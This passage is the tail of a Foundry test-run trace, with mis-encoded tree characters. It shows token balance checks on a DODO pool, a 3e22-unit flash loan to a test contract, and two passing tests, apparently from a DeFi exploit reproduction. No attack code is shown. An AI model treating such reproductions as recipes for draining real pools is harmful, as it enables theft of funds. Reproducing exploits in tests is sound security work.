    в”‚   в”њв”Ђ [531] 0x2170Ed0880ac9A755fd29B2688956BD959F933F8::balanceOf(DODOPool: [0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A]) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 322304667215218905060 [3.223e20]
    в”‚   в”њв”Ђ [531] USDT::balanceOf(DODOPool: [0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A]) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 449531270293071842776636 [4.495e23]
    в”‚   в”њв”Ђ emit DODOFlashLoan(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0, : 30000000000000000000000 [3e22])
    в”‚   в””в”Ђ в†ђ [Stop] 
    в””в”Ђ в†ђ [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 288.64ms (15.36ms CPU time)

Ran 2 test suites in 290.36ms (537.52ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
